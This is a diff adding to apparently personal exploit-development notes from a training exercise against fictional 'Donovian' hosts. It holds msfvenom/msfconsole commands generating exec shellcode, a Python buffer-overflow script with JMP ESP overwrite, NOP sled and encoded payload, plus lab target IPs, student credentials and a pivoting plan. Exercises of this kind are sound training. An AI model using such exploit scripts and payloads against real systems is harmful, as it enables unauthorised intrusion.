@@ -313,11 +313,78 @@ find /b <start of address>, <end stack address>, 0xff, 0xe4 (look from start of 
 0xf7de3b59 -> \x59\x3b\xde\xf7  JMP ESP (switch to big endian)
 
 #Making payload
+
 msfconsole
+use payload/linux/x86/exec
+show options
+set CMD 'whoami && ifconfig'
+generate -b '\x00' -f python  (\x00 gets rid of null bytes)
 
+or
 
+msfvenom -p linux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python
 
+SCRIPT
 
+ #!/usr/bin/python2.7
+  2 
+  3 #Fill Buffer
+  4 
+  5 buf = "A" * 62
+  6 
+  7 #Overwrite EIP Register
+  8 
+  9 buf += "\x59\x3b\xde\xf7"
+ 10 
+ 11 
+ 12 #NOP SLED
+ 13 buf += "\x90" * 10
+ 14 
+ 15 #Payload
+ 16 
+ 17 buf += b"\xdb\xda\xb8\x0a\x9f\xcd\x7f\xd9\x74\x24\xf4\x5b"
+ 18 buf += b"\x31\xc9\xb1\x0e\x31\x43\x19\x83\xeb\xfc\x03\x43"
+ 19 buf += b"\x15\xe8\x6a\xa7\x74\xb4\x0d\x6a\xed\x2c\x03\xe8"
+ 20 buf += b"\x78\x4b\x33\xc1\x09\xfb\xc4\x75\xc1\x99\xad\xeb"
+ 21 buf += b"\x94\xbe\x7c\x1c\xb5\x40\x81\xdc\xcd\x28\xee\xbd"
+ 22 buf += b"\x5c\xc1\xd0\x1b\xb9\x31\x78\x02\xa6\x5e\x14\xac"
+ 23 buf += b"\x41\xc7\xe8\x67\xc1\x8e\x08\x4a\x65"
+ 24 
+ 25 print(buf)
+
+T1
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+
+T2
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: unknown
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+
+T3
+Hostname: unknown
+IP: 192.168.150.245
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Exploit a network service on the machine
+
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.111
+->T2: 192.168.28.105
+
+>Jump Box
+->donovian_grey_host
+-->T3: 192.168.150.245
 
 
 
